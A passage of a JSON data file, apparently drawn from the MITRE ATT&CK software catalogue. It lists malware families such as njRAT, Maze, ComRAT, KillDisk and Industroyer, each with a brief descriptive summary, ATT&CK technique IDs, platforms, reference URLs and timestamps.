      "description": "[njRAT](https://attack.mitre.org/software/S0385) is a remote access tool (RAT) that was first observed in 2012. It has been used by threat actors in the Middle East.(Citation: Fidelis njRAT June 2013)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1082",
        "T1555.003",
        "T1010",
        "T1105",
        "T1083",
        "T1012",
        "T1120",
        "T1125",
        "T1113",
        "T1106",
        "T1018",
        "T1070.004",
        "T1059.001",
        "T1562.004",
        "T1027.013",
        "T1132.001",
        "T1027.004",
        "T1571",
        "T1091",
        "T1033",
        "T1547.001",
        "T1021.001",
        "T1056.001",
        "T1071.001",
        "T1070.009",
        "T1112",
        "T1041",
        "T1057",
        "T1568.001",
        "T1059.003",
        "T1005"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0385",
      "stix_id": "malware--d906e6f7-434c-44c0-b51a-ed50af8f7945",
      "created": "2019-06-04T17:52:28.806000+00:00",
      "modified": "2024-11-17T16:13:48.723000+00:00"
    },
    "S1114": {
      "id": "S1114",
      "name": "ZIPLINE",
      "description": "[ZIPLINE](https://attack.mitre.org/software/S1114) is a passive backdoor that was used during [Cutting Edge](https://attack.mitre.org/campaigns/C0029) on compromised Secure Connect VPNs for reverse shell and proxy functionality.(Citation: Mandiant Cutting Edge January 2024)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1090",
        "T1057",
        "T1205",
        "T1095",
        "T1562.001",
        "T1573.001",
        "T1059.004",
        "T1083",
        "T1105"
      ],
      "platforms": [
        "Network Devices"
      ],
      "url": "https://attack.mitre.org/software/S1114",
      "stix_id": "malware--d9765cbd-4c88-4805-ba98-4c6ccb56b864",
      "created": "2024-03-01T19:25:32.551000+00:00",
      "modified": "2025-04-15T19:46:35.730000+00:00"
    },
    "S0449": {
      "id": "S0449",
      "name": "Maze",
      "description": "[Maze](https://attack.mitre.org/software/S0449) ransomware, previously known as \"ChaCha\", was discovered in May 2019. In addition to encrypting files on victim machines for impact, [Maze](https://attack.mitre.org/software/S0449) operators conduct information stealing campaigns prior to encryption and post the information online to extort affected companies.(Citation: FireEye Maze May 2020)(Citation: McAfee Maze March 2020)(Citation: Sophos Maze VM September 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1486",
        "T1027.016",
        "T1082",
        "T1547.001",
        "T1036.004",
        "T1614.001",
        "T1049",
        "T1564.006",
        "T1055.001",
        "T1529",
        "T1568",
        "T1106",
        "T1071.001",
        "T1059.003",
        "T1053.005",
        "T1047",
        "T1057",
        "T1070",
        "T1562.001",
        "T1489",
        "T1027",
        "T1218.007",
        "T1490"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0449",
      "stix_id": "malware--d9f7383c-95ec-4080-bbce-121c9384457b",
      "created": "2020-05-18T16:17:59.464000+00:00",
      "modified": "2025-04-25T14:44:49.604000+00:00"
    },
    "S0114": {
      "id": "S0114",
      "name": "BOOTRASH",
      "description": "[BOOTRASH](https://attack.mitre.org/software/S0114) is a [Bootkit](https://attack.mitre.org/techniques/T1542/003) that targets Windows operating systems. It has been used by threat actors that target the financial sector.(Citation: Mandiant M Trends 2016)(Citation: FireEye Bootkits)(Citation: FireEye BOOTRASH SANS)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1564.005",
        "T1542.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0114",
      "stix_id": "malware--da2ef4a9-7cbe-400a-a379-e2f230f28db3",
      "created": "2017-05-31T21:33:08.292000+00:00",
      "modified": "2024-11-17T16:24:43.289000+00:00"
    },
    "S0126": {
      "id": "S0126",
      "name": "ComRAT",
      "description": "[ComRAT](https://attack.mitre.org/software/S0126) is a second stage implant suspected of being a descendant of [Agent.btz](https://attack.mitre.org/software/S0092) and used by [Turla](https://attack.mitre.org/groups/G0010). The first version of [ComRAT](https://attack.mitre.org/software/S0126) was identified in 2007, but the tool has undergone substantial development for many years since.(Citation: Symantec Waterbug)(Citation: NorthSec 2015 GData Uroburos Tools)(Citation: ESET ComRAT May 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1071.003",
        "T1564.005",
        "T1071.001",
        "T1053.005",
        "T1573.002",
        "T1518",
        "T1055.001",
        "T1027",
        "T1027.011",
        "T1027.010",
        "T1029",
        "T1546.015",
        "T1102.002",
        "T1106",
        "T1059.003",
        "T1140",
        "T1012",
        "T1059.001",
        "T1112",
        "T1124",
        "T1027.009",
        "T1036.004"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0126",
      "stix_id": "malware--da5880b4-f7da-4869-85f2-e0aba84b8565",
      "created": "2017-05-31T21:33:13.252000+00:00",
      "modified": "2025-04-16T20:38:37.924000+00:00"
    },
    "S0199": {
      "id": "S0199",
      "name": "TURNEDUP",
      "description": "[TURNEDUP](https://attack.mitre.org/software/S0199) is a non-public backdoor. It has been dropped by [APT33](https://attack.mitre.org/groups/G0064)'s [StoneDrill](https://attack.mitre.org/software/S0380) malware. (Citation: FireEye APT33 Sept 2017) (Citation: FireEye APT33 Webinar Sept 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1055.004",
        "T1113",
        "T1105",
        "T1059.003",
        "T1082",
        "T1547.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0199",
      "stix_id": "malware--db1355a7-e5c9-4e2c-8da7-eccf2ae9bf5c",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2025-04-25T14:44:50.321000+00:00"
    },
    "S0144": {
      "id": "S0144",
      "name": "ChChes",
      "description": "[ChChes](https://attack.mitre.org/software/S0144) is a Trojan that appears to be used exclusively by [menuPass](https://attack.mitre.org/groups/G0045). It was used to target Japanese organizations in 2016. Its lack of persistence methods suggests it may be intended as a first-stage tool. (Citation: Palo Alto menuPass Feb 2017) (Citation: JPCERT ChChes Feb 2017) (Citation: PWC Cloud Hopper Technical Annex April 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1071.001",
        "T1562.001",
        "T1547.001",
        "T1132.001",
        "T1105",
        "T1555.003",
        "T1082",
        "T1083",
        "T1573.001",
        "T1036.005",
        "T1057",
        "T1553.002"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0144",
      "stix_id": "malware--dc5d1a33-62aa-4a0c-aa8c-589b87beb11e",
      "created": "2017-05-31T21:33:22.451000+00:00",
      "modified": "2024-11-17T16:46:57.582000+00:00"
    },
    "S0393": {
      "id": "S0393",
      "name": "PowerStallion",
      "description": "[PowerStallion](https://attack.mitre.org/software/S0393) is a lightweight [PowerShell](https://attack.mitre.org/techniques/T1059/001) backdoor used by [Turla](https://attack.mitre.org/groups/G0010), possibly as a recovery access tool to install other backdoors.(Citation: ESET Turla PowerShell May 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1102.002",
        "T1027",
        "T1059.001",
        "T1070.006",
        "T1057"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0393",
      "stix_id": "malware--dcac85c1-6485-4790-84f6-de5e6f6b91dd",
      "created": "2019-06-21T17:23:27.855000+00:00",
      "modified": "2025-04-25T14:44:50.859000+00:00"
    },
    "S1074": {
      "id": "S1074",
      "name": "ANDROMEDA",
      "description": "[ANDROMEDA](https://attack.mitre.org/software/S1074) is commodity malware that was widespread in the early 2010's and continues to be observed in infections across a wide variety of industries. During the 2022 [C0026](https://attack.mitre.org/campaigns/C0026) campaign, threat actors re-registered expired [ANDROMEDA](https://attack.mitre.org/software/S1074) C2 domains to spread malware to select targets in Ukraine.(Citation: Mandiant Suspected Turla Campaign February 2023)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1105",
        "T1055",
        "T1071.001",
        "T1036.005",
        "T1036.008",
        "T1547.001",
        "T1091"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1074",
      "stix_id": "malware--dcd9548e-df9e-47c2-81f3-bc084289959d",
      "created": "2023-05-16T19:24:37.394000+00:00",
      "modified": "2023-09-29T18:11:31.659000+00:00"
    },
    "S1156": {
      "id": "S1156",
      "name": "Manjusaka",
      "description": "[Manjusaka](https://attack.mitre.org/software/S1156) is a Chinese-language intrusion framework, similar to [Sliver](https://attack.mitre.org/software/S0633) and [Cobalt Strike](https://attack.mitre.org/software/S0154), with an ELF binary written in GoLang as the controller for Windows and Linux implants written in Rust. First identified in 2022, [Manjusaka](https://attack.mitre.org/software/S1156) consists of multiple components, only one of which (a command and control module) is freely available.(Citation: Talos Manjusaka 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1082",
        "T1555",
        "T1016",
        "T1555.003",
        "T1041",
        "T1059.003",
        "T1083",
        "T1113",
        "T1132.001",
        "T1071.001"
      ],
      "platforms": [
        "Linux",
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1156",
      "stix_id": "malware--dd2ad3d7-d7ef-4af5-a919-bfe8f2571705",
      "created": "2024-09-04T18:15:43.225000+00:00",
      "modified": "2024-09-06T18:11:40.228000+00:00"
    },
    "S1022": {
      "id": "S1022",
      "name": "IceApple",
      "description": "[IceApple](https://attack.mitre.org/software/S1022) is a modular Internet Information Services (IIS) post-exploitation framework, that has been used since at least 2021 against the technology, academic, and government sectors.(Citation: CrowdStrike IceApple May 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1016",
        "T1027.010",
        "T1003.004",
        "T1036.005",
        "T1070.004",
        "T1552.002",
        "T1041",
        "T1505.004",
        "T1005",
        "T1140",
        "T1560.001",
        "T1620",
        "T1056.003",
        "T1071.001",
        "T1082",
        "T1083",
        "T1087.002",
        "T1573.001",
        "T1003.002"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1022",
      "stix_id": "malware--dd889a55-fb2c-4ec7-8e9f-c399939a49e1",
      "created": "2022-06-27T15:22:22.979000+00:00",
      "modified": "2025-04-16T20:38:38.400000+00:00"
    },
    "S0201": {
      "id": "S0201",
      "name": "JPIN",
      "description": "[JPIN](https://attack.mitre.org/software/S0201) is a custom-built backdoor family used by [PLATINUM](https://attack.mitre.org/groups/G0068). Evidence suggests developers of [JPIN](https://attack.mitre.org/software/S0201) and [Dipsind](https://attack.mitre.org/software/S0200) code bases were related in some way. (Citation: Microsoft PLATINUM April 2016)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1222.001",
        "T1059.003",
        "T1069.001",
        "T1016",
        "T1057",
        "T1070.004",
        "T1012",
        "T1197",
        "T1071.003",
        "T1562.001",
        "T1083",
        "T1055",
        "T1105",
        "T1056.001",
        "T1033",
        "T1071.002",
        "T1518.001",
        "T1082",
        "T1027",
        "T1007"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0201",
      "stix_id": "malware--de6cb631-52f6-4169-a73b-7965390b0c30",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2025-04-25T14:44:51.758000+00:00"
    },
    "S1059": {
      "id": "S1059",
      "name": "metaMain",
      "description": "[metaMain](https://attack.mitre.org/software/S1059) is a backdoor used by [Metador](https://attack.mitre.org/groups/G1013) to maintain long-term access to compromised machines; it has also been used to decrypt [Mafalda](https://attack.mitre.org/software/S1060) into memory.(Citation: SentinelLabs Metador Sept 2022)(Citation: SentinelLabs Metador Technical Appendix Sept 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1033",
        "T1027.013",
        "T1057",
        "T1074.001",
        "T1095",
        "T1546.003",
        "T1620",
        "T1112",
        "T1140",
        "T1560.003",
        "T1056",
        "T1106",
        "T1113",
        "T1071.001",
        "T1497.003",
        "T1005",
        "T1083",
        "T1041",
        "T1090.001",
        "T1574.001",
        "T1105",
        "T1070.004",
        "T1056.001",
        "T1573.001",
        "T1070.006",
        "T1055",
        "T1205.001",
        "T1082"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1059",
      "stix_id": "malware--df350889-4de9-44e5-8cb3-888b8343e97c",
      "created": "2023-01-24T00:12:34.751000+00:00",
      "modified": "2024-04-11T00:45:31.029000+00:00"
    },
    "S0610": {
      "id": "S0610",
      "name": "SideTwist",
      "description": "[SideTwist](https://attack.mitre.org/software/S0610) is a C-based backdoor that has been used by [OilRig](https://attack.mitre.org/groups/G0049) since at least 2021.(Citation: Check Point APT34 April 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1106",
        "T1132.001",
        "T1033",
        "T1573.001",
        "T1083",
        "T1059.003",
        "T1105",
        "T1071.001",
        "T1016",
        "T1140",
        "T1005",
        "T1008",
        "T1041",
        "T1082",
        "T1001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0610",
      "stix_id": "malware--df4cd566-ff2f-4d08-976d-8c86e95782de",
      "created": "2021-05-06T14:44:50.494000+00:00",
      "modified": "2025-04-25T14:44:52.304000+00:00"
    },
    "S0669": {
      "id": "S0669",
      "name": "KOCTOPUS",
      "description": "[KOCTOPUS](https://attack.mitre.org/software/S0669)'s batch variant is loader used by [LazyScripter](https://attack.mitre.org/groups/G0140) since 2018 to launch [Octopus](https://attack.mitre.org/software/S0340) and [Koadic](https://attack.mitre.org/software/S0250) and, in some cases, [QuasarRAT](https://attack.mitre.org/software/S0262). [KOCTOPUS](https://attack.mitre.org/software/S0669) also has a VBA variant that has the same functionality as the batch version.(Citation: MalwareBytes LazyScripter Feb 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1566.001",
        "T1140",
        "T1204.002",
        "T1090",
        "T1112",
        "T1566.002",
        "T1082",
        "T1564.003",
        "T1059.003",
        "T1105",
        "T1562.001",
        "T1204.001",
        "T1070.009",
        "T1036.005",
        "T1106",
        "T1059.001",
        "T1548.002",
        "T1027.010",
        "T1059.005",
        "T1547.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0669",
      "stix_id": "malware--df9b350b-d4f9-4e79-a826-75cc75fbc1eb",
      "created": "2021-12-06T22:38:37.418000+00:00",
      "modified": "2024-11-17T14:12:07.295000+00:00"
    },
    "S0459": {
      "id": "S0459",
      "name": "MechaFlounder",
      "description": "[MechaFlounder](https://attack.mitre.org/software/S0459) is a python-based remote access tool (RAT) that has been used by [APT39](https://attack.mitre.org/groups/G0087). The payload uses a combination of actor developed code and code snippets freely available online in development communities.(Citation: Unit 42 MechaFlounder March 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1041",
        "T1036.005",
        "T1033",
        "T1132.001",
        "T1071.001",
        "T1059.003",
        "T1059.006",
        "T1105"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0459",
      "stix_id": "malware--dfa03c7d-79ed-4ce2-b9d1-ddc9dbf56ad2",
      "created": "2020-05-27T19:05:29.386000+00:00",
      "modified": "2025-04-25T14:44:52.837000+00:00"
    },
    "S0078": {
      "id": "S0078",
      "name": "Psylo",
      "description": "[Psylo](https://attack.mitre.org/software/S0078) is a shellcode-based Trojan that has been used by [Scarlet Mimic](https://attack.mitre.org/groups/G0029). It has similar characteristics as [FakeM](https://attack.mitre.org/software/S0076). (Citation: Scarlet Mimic Jan 2016)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1071.001",
        "T1083",
        "T1105",
        "T1041",
        "T1070.006"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0078",
      "stix_id": "malware--dfb5fa9b-3051-4b97-8035-08f80aef945b",
      "created": "2017-05-31T21:32:53.268000+00:00",
      "modified": "2025-04-25T14:44:53.196000+00:00"
    },
    "S1027": {
      "id": "S1027",
      "name": "Heyoka Backdoor",
      "description": "[Heyoka Backdoor](https://attack.mitre.org/software/S1027) is a custom backdoor--based on the Heyoka open source exfiltration tool--that  has been used by [Aoqin Dragon](https://attack.mitre.org/groups/G1007) since at least 2013.(Citation: SentinelOne Aoqin Dragon June 2022)(Citation: Sourceforge Heyoka 2022) ",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1055.001",
        "T1070.004",
        "T1572",
        "T1140",
        "T1071.004",
        "T1082",
        "T1007",
        "T1057",
        "T1218.011",
        "T1083",
        "T1547.001",
        "T1027.013",
        "T1120",
        "T1036.004",
        "T1204.002"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1027",
      "stix_id": "malware--dff90475-9f72-41a6-84ed-1fbefd3874c0",
      "created": "2022-07-25T18:18:32.811000+00:00",
      "modified": "2024-04-11T02:20:55.694000+00:00"
    },
    "S0070": {
      "id": "S0070",
      "name": "HTTPBrowser",
      "description": "[HTTPBrowser](https://attack.mitre.org/software/S0070) is malware that has been used by several threat groups. (Citation: ThreatStream Evasion Analysis) (Citation: Dell TG-3390) It is believed to be of Chinese origin. (Citation: ThreatConnect Anthem)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1105",
        "T1574.001",
        "T1547.001",
        "T1027",
        "T1059.003",
        "T1036.005",
        "T1071.004",
        "T1083",
        "T1056.001",
        "T1071.001",
        "T1070.004"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0070",
      "stix_id": "malware--e066bf86-9cfb-407a-9d25-26fd5d91e360",
      "created": "2017-05-31T21:32:46.445000+00:00",
      "modified": "2025-04-25T14:44:53.772000+00:00"
    },
    "S0084": {
      "id": "S0084",
      "name": "Mis-Type",
      "description": "[Mis-Type](https://attack.mitre.org/software/S0084) is a backdoor hybrid that was used in [Operation Dust Storm](https://attack.mitre.org/campaigns/C0016) by 2012.(Citation: Cylance Dust Storm)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1106",
        "T1547",
        "T1016",
        "T1059.003",
        "T1105",
        "T1036.005",
        "T1136.001",
        "T1132.001",
        "T1071.001",
        "T1033",
        "T1087.001",
        "T1008",
        "T1005",
        "T1082",
        "T1041",
        "T1095",
        "T1055",
        "T1074.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0084",
      "stix_id": "malware--e1161124-f22e-487f-9d5f-ed8efc8dcd61",
      "created": "2017-05-31T21:32:55.565000+00:00",
      "modified": "2025-04-16T20:38:39.359000+00:00"
    },
    "S1141": {
      "id": "S1141",
      "name": "LunarWeb",
      "description": "[LunarWeb](https://attack.mitre.org/software/S1141) is a backdoor that has been used by [Turla](https://attack.mitre.org/groups/G0010) since at least 2020 including in a compromise of a European ministry of foreign affairs (MFA) together with [LunarLoader](https://attack.mitre.org/software/S1143) and [LunarMail](https://attack.mitre.org/software/S1142). [LunarWeb](https://attack.mitre.org/software/S1141) has only been observed deployed against servers and can use [Steganography](https://attack.mitre.org/techniques/T1001/002) to obfuscate command and control.(Citation: ESET Turla Lunar toolset May 2024)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1615",
        "T1001.002",
        "T1059.003",
        "T1082",
        "T1059.001",
        "T1573.002",
        "T1104",
        "T1560.002",
        "T1497.003",
        "T1572",
        "T1083",
        "T1135",
        "T1573.001",
        "T1518",
        "T1560.001",
        "T1016",
        "T1140",
        "T1070.004",
        "T1049",
        "T1071.001",
        "T1027.013",
        "T1057",
        "T1047",
        "T1069.001",
        "T1090",
        "T1030",
        "T1559",
        "T1132.001",
        "T1033",
        "T1518.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1141",
      "stix_id": "malware--e1284931-3f85-4262-a641-9ae8bb0576a0",
      "created": "2024-06-26T18:07:37.796000+00:00",
      "modified": "2024-08-16T14:42:02.739000+00:00"
    },
    "S0658": {
      "id": "S0658",
      "name": "XCSSET",
      "description": "[XCSSET](https://attack.mitre.org/software/S0658) is a modular macOS malware family delivered through infected Xcode projects and executed when the project is compiled. Active since August 2020, it has been observed installing backdoors, spoofed browsers, collecting data, and encrypting user files. It is composed of SHC-compiled shell scripts and run-only AppleScripts, often hiding in apps that mimic system tools (such as Xcode, Mail, or Notes) or use familiar icons (like Launchpad) to avoid detection.(Citation: trendmicro xcsset xcode project 2020)(Citation: April 2021 TrendMicro XCSSET)(Citation: Microsoft March 2025 XCSSET)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1564.001",
        "T1518",
        "T1614.001",
        "T1105",
        "T1041",
        "T1553.001",
        "T1036",
        "T1195.001",
        "T1098.004",
        "T1005",
        "T1573.001",
        "T1574.006",
        "T1560",
        "T1548.006",
        "T1222.002",
        "T1539",
        "T1056.002",
        "T1068",
        "T1569.001",
        "T1518.001",
        "T1486",
        "T1082",
        "T1543.004",
        "T1647",
        "T1027.013",
        "T1083",
        "T1059.004",
        "T1497.003",
        "T1554",
        "T1087",
        "T1546",
        "T1113",
        "T1546.004"
      ],
      "platforms": [
        "macOS"
      ],
      "url": "https://attack.mitre.org/software/S0658",
      "stix_id": "malware--e14085cb-0e8d-4be6-92ba-e3b93ee5978f",
      "created": "2021-10-05T21:58:51.161000+00:00",
      "modified": "2025-04-04T17:39:46.453000+00:00"
    },
    "S1088": {
      "id": "S1088",
      "name": "Disco",
      "description": "[Disco](https://attack.mitre.org/software/S1088) is a custom implant that has been used by [MoustachedBouncer](https://attack.mitre.org/groups/G1019) since at least 2020 including in campaigns using targeted malicious content injection for initial access and command and control.(Citation: MoustachedBouncer ESET August 2023)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1105",
        "T1659",
        "T1053.005",
        "T1204.002",
        "T1071.002"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1088",
      "stix_id": "malware--e1445afd-c359-45ed-8f27-626dc4d5e157",
      "created": "2023-09-25T20:29:37.737000+00:00",
      "modified": "2023-10-04T17:18:07.384000+00:00"
    },
    "S0200": {
      "id": "S0200",
      "name": "Dipsind",
      "description": "[Dipsind](https://attack.mitre.org/software/S0200) is a malware family of backdoors that appear to be used exclusively by [PLATINUM](https://attack.mitre.org/groups/G0068). (Citation: Microsoft PLATINUM April 2016)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1105",
        "T1573.001",
        "T1547.004",
        "T1029",
        "T1059.003",
        "T1132.001",
        "T1071.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0200",
      "stix_id": "malware--e170995d-4f61-4f17-b60e-04f9a06ee517",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2025-04-25T14:44:54.842000+00:00"
    },
    "S0340": {
      "id": "S0340",
      "name": "Octopus",
      "description": "[Octopus](https://attack.mitre.org/software/S0340) is a Windows Trojan written in the Delphi programming language that has been used by [Nomadic Octopus](https://attack.mitre.org/groups/G0133) to target government organizations in Central Asia since at least 2014.(Citation: Securelist Octopus Oct 2018)(Citation: Security Affairs DustSquad Oct 2018)(Citation: ESET Nomadic Octopus 2018) ",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1005",
        "T1033",
        "T1132.001",
        "T1041",
        "T1036.005",
        "T1016",
        "T1083",
        "T1567.002",
        "T1082",
        "T1547.001",
        "T1074.001",
        "T1560.001",
        "T1047",
        "T1071.001",
        "T1566.001",
        "T1105",
        "T1204.002",
        "T1113"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0340",
      "stix_id": "malware--e2031fd5-02c2-43d4-85e2-b64f474530c2",
      "created": "2019-01-30T13:24:08.616000+00:00",
      "modified": "2025-04-16T20:38:39.717000+00:00"
    },
    "S0607": {
      "id": "S0607",
      "name": "KillDisk",
      "description": "[KillDisk](https://attack.mitre.org/software/S0607) is a disk-wiping tool designed to overwrite files with random data to render the OS unbootable. It was first observed as a component of [BlackEnergy](https://attack.mitre.org/software/S0089) malware during cyber attacks against Ukraine in 2015. [KillDisk](https://attack.mitre.org/software/S0607) has since evolved into stand-alone malware used by a variety of threat actors against additional targets in Europe and Latin America; in 2016 a ransomware component was also incorporated into some [KillDisk](https://attack.mitre.org/software/S0607) variants.(Citation: KillDisk Ransomware)(Citation: ESEST Black Energy Jan 2016)(Citation: Trend Micro KillDisk 1)(Citation: Trend Micro KillDisk 2)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1083",
        "T1106",
        "T1082",
        "T1129",
        "T1057",
        "T1027",
        "T1489",
        "T1070.001",
        "T1529",
        "T1561.002",
        "T1486",
        "T1070.004",
        "T1036.004",
        "T1134",
        "T1485"
      ],
      "platforms": [
        "Linux",
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0607",
      "stix_id": "malware--e221eb77-1502-4129-af1d-fe1ad55e7ec6",
      "created": "2021-01-20T18:05:07.059000+00:00",
      "modified": "2023-10-06T14:09:52.833000+00:00"
    },
    "S0584": {
      "id": "S0584",
      "name": "AppleJeus",
      "description": "[AppleJeus](https://attack.mitre.org/software/S0584) is a family of downloaders initially discovered in 2018 embedded within trojanized cryptocurrency applications. [AppleJeus](https://attack.mitre.org/software/S0584) has been used by [Lazarus Group](https://attack.mitre.org/groups/G0032), targeting companies in the energy, finance, government, industry, technology, and telecommunications sectors, and several countries including the United States, United Kingdom, South Korea, Australia, Brazil, New Zealand, and Russia. [AppleJeus](https://attack.mitre.org/software/S0584) has been used to distribute the [FALLCHILL](https://attack.mitre.org/software/S0181) RAT.(Citation: CISA AppleJeus Feb 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1140",
        "T1070.004",
        "T1546.016",
        "T1041",
        "T1566.002",
        "T1543.003",
        "T1564.001",
        "T1569.001",
        "T1071.001",
        "T1553.002",
        "T1059.004",
        "T1082",
        "T1218.007",
        "T1053.005",
        "T1548.002",
        "T1204.002",
        "T1027",
        "T1497.003",
        "T1543.004",
        "T1204.001"
      ],
      "platforms": [
        "Windows",
        "macOS"
      ],
      "url": "https://attack.mitre.org/software/S0584",
      "stix_id": "malware--e2d34c63-6f5a-41f5-86a2-e2380f27f858",
      "created": "2021-03-01T20:17:11.064000+00:00",
      "modified": "2025-04-16T20:38:39.879000+00:00"
    },
    "S0516": {
      "id": "S0516",
      "name": "SoreFang",
      "description": "[SoreFang](https://attack.mitre.org/software/S0516) is first stage downloader used by [APT29](https://attack.mitre.org/groups/G0016) for exfiltration and to load other malware.(Citation: NCSC APT29 July 2020)(Citation: CISA SoreFang July 2016)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1105",
        "T1087.002",
        "T1057",
        "T1083",
        "T1071.001",
        "T1190",
        "T1053.005",
        "T1082",
        "T1087.001",
        "T1069.002",
        "T1016",
        "T1027",
        "T1140"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0516",
      "stix_id": "malware--e33e4603-afab-402d-b2a1-248d435b5fe0",
      "created": "2020-09-29T19:33:35.122000+00:00",
      "modified": "2025-04-25T14:44:55.728000+00:00"
    },
    "S1037": {
      "id": "S1037",
      "name": "STARWHALE",
      "description": "[STARWHALE](https://attack.mitre.org/software/S1037) is Windows Script File (WSF) backdoor that has been used by [MuddyWater](https://attack.mitre.org/groups/G0069), possibly since at least November 2021; there is also a [STARWHALE](https://attack.mitre.org/software/S1037) variant written in Golang with similar capabilities. Security researchers have also noted the use of [STARWHALE](https://attack.mitre.org/software/S1037) by UNC3313, which may be associated with [MuddyWater](https://attack.mitre.org/groups/G0069).(Citation: Mandiant UNC3313 Feb 2022)(Citation: DHS CISA AA22-055A MuddyWater February 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1082",
        "T1543.003",
        "T1041",
        "T1547.001",
        "T1071.001",
        "T1033",
        "T1204.002",
        "T1059.005",
        "T1016",
        "T1027.013",
        "T1059.003",
        "T1132.001",
        "T1005",
        "T1074.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1037",
      "stix_id": "malware--e355fc84-6f3c-4888-8e0a-d7fa9c378532",
      "created": "2022-08-18T15:00:32.571000+00:00",
      "modified": "2024-04-11T00:01:29.506000+00:00"
    },
    "S0280": {
      "id": "S0280",
      "name": "MirageFox",
      "description": "[MirageFox](https://attack.mitre.org/software/S0280) is a remote access tool used against Windows systems. It appears to be an upgraded version of a tool known as Mirage, which is a RAT believed to originate in 2012. (Citation: APT15 Intezer June 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1082",
        "T1574.001",
        "T1059.003",
        "T1033",
        "T1140"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0280",
      "stix_id": "malware--e3cedcfe-6515-4348-af65-7f2c4157bf0d",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2025-04-16T20:38:40.181000+00:00"
    },
    "S0604": {
      "id": "S0604",
      "name": "Industroyer",
      "description": "[Industroyer](https://attack.mitre.org/software/S0604) is a sophisticated malware framework designed to cause an impact to the working processes of Industrial Control Systems (ICS), specifically components used in electrical substations.(Citation: ESET Industroyer) [Industroyer](https://attack.mitre.org/software/S0604) was used in the attacks on the Ukrainian power grid in December 2016.(Citation: Dragos Crashoverride 2017) This is the first publicly known malware specifically designed to target and impact operations in the electric grid.(Citation: Dragos Crashoverride 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1543.003",
        "T1485",
        "T1046",
        "T1078",
        "T1554",
        "T1105",
        "T1018",
        "T1083",
        "T1572",
        "T1016",
        "T1489",
        "T1041",
        "T1071.001",
        "T1090.003",
        "T1082",
        "T1499.004",
        "T1140",
        "T1012",
        "T1027"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0604",
      "stix_id": "malware--e401d4fe-f0c9-44f0-98e6-f93487678808",
      "created": "2021-01-04T20:42:21.997000+00:00",
      "modified": "2024-04-11T16:06:34.700000+00:00"
    },
